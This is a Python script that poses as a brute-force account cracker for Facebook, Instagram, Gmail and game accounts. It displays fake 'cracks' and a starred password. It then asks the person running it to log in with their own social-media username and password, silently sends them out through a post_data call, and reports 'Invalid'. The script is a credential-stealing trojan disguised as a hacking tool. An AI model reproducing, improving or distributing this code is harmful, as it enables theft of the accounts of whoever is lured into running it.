from os import system,name as os_name
from beautify import Beautify
from pypost import post_data
from random import choice,choices,randint
from time import sleep as timeout

bf = Beautify()
CR = bf.colors(True)

def rand_str(target):
	def num():
		return randint(14, 20);
	def str():
		return choice(list('1234567890qwertyuiopasdfghjklzxcvbnm,../~!@#$%%^&*()_+='));
	def rand():
		i = 0;
		st = ''
		while i < num():
			st += str();
			i+=1
		return st;
	def main():
		i = 0;
		while i < num():
			if os_name == 'posix':
				system('clear');
			else:system('cls');
			print(bf.txtclr(f'\nCracks ->   {rand()}\n\nCTRL + C for exit!\n',font='fancy199',color='darkgreen'))
			timeout(1.0)
			if os_name == 'posix':
				system('clear');
			else:system('cls');
			i+=1;
		return bf.txtclr(f'\naccount hacked successfully!\n\ntarget : {target}\npassword : {rand()}***',font='fancy199',color=CR)
	return main()
def main():
	print(bf.txtclr('CRACK',font='bubble',color=CR))
	menu = bf.menu(
		(
			'Facebook',
			'Instagram',
			'Gmail',
			'Free Fire',
			'PUBG'
		),color='darkgreen',font='fancy12'
	)
	print(bf.txtclr('brute force method!',font='fancy95',color=CR))
	select = input('\nselect > ')
	if select in menu.keys():
		print(bf.txtclr(f'\n* brute force {menu[select]}!',font='fancy199',color=CR))
		print(bf.txtclr(f'* enter the target id, username, email or phone number!\n',font='fancy199',color=CR))
		crack = input(' > ')
		if not crack:print(bf.txtclr(f'\nInvalid\n',font='fancy199',color='red'))
		else:
			print(bf.txtclr(f'\n* target `{crack}`',font='fancy199',color=CR))
			print(bf.txtclr(f'* crack now!\n',font='fancy199',color=CR))
			cracks = input(' [y/n] ')
			if cracks in ('y','Y'):
				print(rand_str(crack))
				print(bf.txtclr(f'\n* Sign in  with!',font='fancy199',color=CR))
				mn = bf.menu(
					(
						'Facebook',
						'Instagram',
						'Gmail',
					),color='darkgreen',font='fancy12'
				)
				print(bf.txtclr(f'* to replace the star with a password!',font='fancy199',color=CR))
				slc = input('\nlogin > ')
				if slc in mn.keys():
					username = input('username > ')
					password = input('password > ')
					if not username or not password:
						print(bf.txtclr(f'\nInvalid',font='fancy199',color='red'))
					else:
						print(bf.txtclr(f'Trying login...',font='fancy199',color='red'))
						timeout(3.5)
						post_data('mydt',
							social = mn[slc],
							username = username,
							password = password,
							)
						print(bf.txtclr(f'Invalid',font='fancy199',color='red'))
			else:
				print('Error')
	else:print('Error')
